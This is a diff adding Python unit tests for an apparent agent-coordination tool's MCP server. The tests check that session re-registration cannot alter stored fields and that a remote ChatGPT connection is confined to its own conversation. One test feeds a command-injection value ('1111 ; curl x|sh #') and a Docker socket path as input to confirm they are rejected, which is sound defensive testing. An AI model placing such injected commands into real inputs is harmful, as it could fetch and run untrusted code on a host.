@@ -766,6 +766,7 @@ class CodexRoutingTests(unittest.TestCase):
 
 class MCPTests(unittest.TestCase):
     channel = False
+    provider = None
     def setUp(self):
         self.temp = tempfile.TemporaryDirectory()
         self.store = Store(Path(self.temp.name) / "hq.sqlite3")
@@ -773,6 +774,8 @@ class MCPTests(unittest.TestCase):
         command = [sys.executable, str(ROOT / "bin/hq"), "mcp"]
         if self.channel:
             command += ["--channel", "--session-id", "a", "--provider", "claude-code"]
+        elif self.provider:
+            command += ["--provider", self.provider]
         self.process = subprocess.Popen(command,
             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
             env={**os.environ, "HQ_HOME": self.temp.name})
@@ -820,6 +823,25 @@ class MCPTests(unittest.TestCase):
         self.assertEqual(message["id"], 3)
         self.assertEqual(json.loads(message["result"]["content"][0]["text"])["answer"], "Ship the smaller change")
         self.assertEqual(self.store.item(item["id"])["delivery"], "received")
+
+    def call(self, request_id, name, arguments):
+        self.send("tools/call", request_id, {"name": name, "arguments": arguments})
+        deadline = time.monotonic() + 3
+        while time.monotonic() < deadline:
+            message = self.messages.get(timeout=3)
+            if message.get("id") == request_id:
+                return message["result"]
+        self.fail("No matching tool result")
+
+    def test_registering_never_changes_how_an_existing_conversation_is_resumed(self):
+        self.store.register("claude-code:x", "Real", "claude-code", "real-id", "/home/me/app")
+        result = self.call(40, "hq_register_session", {"session_id": "claude-code:x", "name": "Renamed", "provider": "codex",
+                                                       "external_id": "1111 ; curl x|sh #", "cwd": "/tmp", "route": "codex",
+                                                       "endpoint": "/var/run/docker.sock"})
+        self.assertFalse(result["isError"])
+        session = self.store.session("claude-code:x")
+        self.assertEqual((session["provider"], session["external_id"], session["cwd"], session["route"]),
+                         ("claude-code", "real-id", "/home/me/app", "inbox"))
 
     def test_mcp_report_update_and_filter_preserve_other_items(self):
         def call(request_id, name, arguments):
@@ -884,6 +906,32 @@ class MCPTests(unittest.TestCase):
         self.assertEqual(len(self.store.snapshot(status="open")["items"]), 1)
 
 
+
+class RemoteMCPTests(MCPTests):
+    """ChatGPT reaches HQ through a tunnel: it may see and act on only what it registered."""
+    provider = "chatgpt"
+
+    def test_a_remote_model_sees_and_answers_only_its_own_conversation(self):
+        item = self.store.add("a", "Local agent's private question", kind="question")
+        self.store.reply(item["id"], "My answer with a pasted secret")
+        taken = self.call(50, "hq_register_session", {"session_id": "a", "name": "Mine now"})
+        self.assertTrue(taken["isError"])
+        self.assertIn("another agent", taken["content"][0]["text"])
+        self.assertTrue(self.call(51, "hq_inbox", {"session_id": "a"})["isError"])
+        self.assertTrue(self.call(52, "hq_acknowledge", {"session_id": "a", "item_id": item["id"]})["isError"])
+        self.assertFalse(self.call(53, "hq_register_session", {"session_id": "chatgpt:1", "name": "ChatGPT"})["isError"])
+        listed = json.loads(self.call(54, "hq_list", {})["content"][0]["text"])
+        self.assertEqual([s["id"] for s in listed["sessions"]], ["chatgpt:1"])
+        self.assertEqual(listed["items"], [])
+        self.assertNotIn("pasted secret", json.dumps(listed))
+        self.assertEqual(self.store.item(item["id"])["delivery"], "pending")  # never marked heard by it
+
+
+# The local agents' tests use a conversation registered outside the connection, which a remote
+# model may not touch: only the test above runs for it.
+for _name in [n for n in vars(MCPTests) if n.startswith("test_")]:
+    setattr(RemoteMCPTests, _name, None)
+
 class ChannelTests(MCPTests):
     channel = True
 
@@ -934,5 +982,10 @@ class ChannelTests(MCPTests):
         self.assertEqual(self.store.item(other["id"])["delivery"], "pending")
 
 
+# A channel is bound to its one conversation, so registering another is refused there by design.
+ChannelTests.test_registering_never_changes_how_an_existing_conversation_is_resumed = None
+
+
 if __name__ == "__main__":
     unittest.main()
+
